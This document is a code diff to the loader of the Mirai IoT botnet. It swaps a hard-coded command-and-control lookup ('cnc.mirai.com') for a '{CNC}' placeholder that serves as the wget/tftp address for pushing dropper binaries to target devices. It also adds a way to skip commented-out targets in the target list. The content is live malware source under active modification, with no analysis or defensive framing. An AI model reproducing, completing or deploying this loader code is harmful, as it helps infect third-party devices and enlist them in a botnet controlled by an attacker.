@@ -6,6 +6,7 @@
 #include <pthread.h>
 #include <sys/socket.h>
 #include <errno.h>
+#include <netdb.h>
 #include "headers/includes.h"
 #include "headers/server.h"
 #include "headers/telnet_info.h"
@@ -49,16 +50,9 @@ int main(int argc, char **args)
         printf("Failed to load bins/dlr.* as dropper\n");
         return 1;
     }
-
-    struct hostent* pHostInfo = gethostbyname("cnc.mirai.com");
-    char *cnc_addr = inet_ntoa(pHostInfo->h_addr);
-
-#ifdef DEBUG
-    printf("CNC Server IP = %s\n", cnc_addr);
-#endif
     
     /*                       sysconf(_SC_NPROCESSORS_ONLN)   wget address  tftp address */
-    if ((srv = server_create(1, addrs_len, addrs, 1024 * 64, cnc_addr, 80, cnc_addr)) == NULL)
+    if ((srv = server_create(1, addrs_len, addrs, 1024 * 64, "{CNC}", 80, "{CNC}")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
@@ -76,8 +70,9 @@ int main(int argc, char **args)
 
         util_trim(strbuf);
 
-        if (strlen(strbuf) == 0)
+        if (strlen(strbuf) == 0 || strbuf[0]=='#')
         {
+            if (strlen(strbuf) > 0) printf("Target %s skipped.\n", strbuf);
             usleep(10000);
             continue;
         }
